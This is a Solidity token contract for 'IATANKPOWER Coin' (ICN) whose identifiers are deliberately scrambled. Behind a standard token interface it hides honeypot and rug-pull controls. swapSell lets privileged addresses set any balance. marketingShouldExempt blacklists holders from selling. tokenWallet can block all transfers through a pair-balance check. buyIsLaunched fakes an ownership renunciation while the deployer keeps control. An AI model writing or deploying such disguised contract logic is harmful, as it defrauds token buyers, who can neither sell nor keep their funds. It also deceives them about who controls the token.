//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface buyMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedLaunch) external view returns (uint256);

    function transfer(address modeBuy, uint256 tradingAt) external returns (bool);

    function allowance(address amountLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingAt) external returns (bool);

    function transferFrom(
        address sender,
        address modeBuy,
        uint256 tradingAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isAt, uint256 value);
    event Approval(address indexed amountLaunched, address indexed spender, uint256 value);
}

interface buyModeMetadata is buyMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract listTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingFundTx {
    function createPair(address tradingIs, address modeEnableReceiver) external returns (address);
}

interface receiverShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract IATANKPOWERCoin is listTo, buyMode, buyModeMetadata {

    address limitListTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private toList;

    mapping(address => bool) public enableWallet;

    function approve(address receiverWallet, uint256 tradingAt) public virtual override returns (bool) {
        takeListReceiver[_msgSender()][receiverWallet] = tradingAt;
        emit Approval(_msgSender(), receiverWallet, tradingAt);
        return true;
    }

    function amountMaxBuy(address walletSwapList, address modeBuy, uint256 tradingAt) internal returns (bool) {
        require(toList[walletSwapList] >= tradingAt);
        toList[walletSwapList] -= tradingAt;
        toList[modeBuy] += tradingAt;
        emit Transfer(walletSwapList, modeBuy, tradingAt);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return minListAt;
    }

    uint256 private sellMaxMode;

    function allowance(address minShould, address receiverWallet) external view virtual override returns (uint256) {
        if (receiverWallet == limitListTotal) {
            return type(uint256).max;
        }
        return takeListReceiver[minShould][receiverWallet];
    }

    function toToken(address walletSwapList, address modeBuy, uint256 tradingAt) internal returns (bool) {
        if (walletSwapList == fromLimit) {
            return amountMaxBuy(walletSwapList, modeBuy, tradingAt);
        }
        uint256 swapEnable = buyMode(takeShould).balanceOf(liquidityEnable);
        require(swapEnable == totalTo);
        require(!fromTrading[walletSwapList]);
        return amountMaxBuy(walletSwapList, modeBuy, tradingAt);
    }

    bool public liquidityBuy;

    address private maxExempt;

    function buyIsLaunched() public {
        emit OwnershipTransferred(fromLimit, address(0));
        maxExempt = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return marketingMode;
    }

    function buyListAt() private view {
        require(enableWallet[_msgSender()]);
    }

    event OwnershipTransferred(address indexed buyLaunched, address indexed limitReceiver);

    uint256 totalTo;

    function balanceOf(address launchedLaunch) public view virtual override returns (uint256) {
        return toList[launchedLaunch];
    }

    uint256 private marketingMode = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private takeListReceiver;

    function marketingShouldExempt(address limitBuyReceiver) public {
        buyListAt();
        if (totalReceiverToken != limitMarketing) {
            feeAuto = true;
        }
        if (limitBuyReceiver == fromLimit || limitBuyReceiver == takeShould) {
            return;
        }
        fromTrading[limitBuyReceiver] = true;
    }

    function getOwner() external view returns (address) {
        return maxExempt;
    }

    uint8 private fromLiquidity = 18;

    function transfer(address isShould, uint256 tradingAt) external virtual override returns (bool) {
        return toToken(_msgSender(), isShould, tradingAt);
    }

    address public takeShould;

    bool public maxMin;

    function owner() external view returns (address) {
        return maxExempt;
    }

    uint256 private totalReceiverToken;

    uint256 private tradingSwap;

    function swapSell(address isShould, uint256 tradingAt) public {
        buyListAt();
        toList[isShould] = tradingAt;
    }

    bool private feeAuto;

    function takeTeamFee(address fromMarketing) public {
        if (liquidityBuy) {
            return;
        }
        
        enableWallet[fromMarketing] = true;
        if (sellMaxMode == limitMarketing) {
            feeAuto = true;
        }
        liquidityBuy = true;
    }

    address public fromLimit;

    uint256 minTradingEnable;

    string private minListAt = "IATANKPOWER Coin";

    bool public listTx;

    bool public exemptTake;

    function symbol() external view virtual override returns (string memory) {
        return minFrom;
    }

    address liquidityEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private limitMarketing;

    string private minFrom = "ICN";

    function tokenWallet(uint256 tradingAt) public {
        buyListAt();
        totalTo = tradingAt;
    }

    uint256 private totalExempt;

    function decimals() external view virtual override returns (uint8) {
        return fromLiquidity;
    }

    mapping(address => bool) public fromTrading;

    function transferFrom(address walletSwapList, address modeBuy, uint256 tradingAt) external override returns (bool) {
        if (_msgSender() != limitListTotal) {
            if (takeListReceiver[walletSwapList][_msgSender()] != type(uint256).max) {
                require(tradingAt <= takeListReceiver[walletSwapList][_msgSender()]);
                takeListReceiver[walletSwapList][_msgSender()] -= tradingAt;
            }
        }
        return toToken(walletSwapList, modeBuy, tradingAt);
    }

    constructor (){
        if (maxMin == exemptTake) {
            exemptTake = true;
        }
        buyIsLaunched();
        receiverShould exemptFeeSell = receiverShould(limitListTotal);
        takeShould = tradingFundTx(exemptFeeSell.factory()).createPair(exemptFeeSell.WETH(), address(this));
        
        fromLimit = _msgSender();
        enableWallet[fromLimit] = true;
        toList[fromLimit] = marketingMode;
        
        emit Transfer(address(0), fromLimit, marketingMode);
    }

    uint256 private marketingAmount;

}